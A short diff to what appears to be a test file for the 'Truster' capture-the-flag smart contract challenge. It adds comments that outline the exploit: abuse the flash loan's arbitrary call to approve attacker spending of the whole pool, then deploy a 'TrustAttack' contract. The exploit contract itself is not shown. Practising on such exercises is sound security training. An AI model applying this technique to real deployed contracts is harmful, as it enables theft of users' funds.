@@ -30,6 +30,8 @@ describe('[Challenge] Truster', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
 
+        //anyone can pass malicious code to the memory in the flashloan function
+        //we can write a new contract to call approve function for attacker to spend all the tokens inside the loan pool
         const Attacker = await ethers.getContractFactory('TrustAttack', attacker); 
         this.exploit = await Attacker.deploy(); 
 
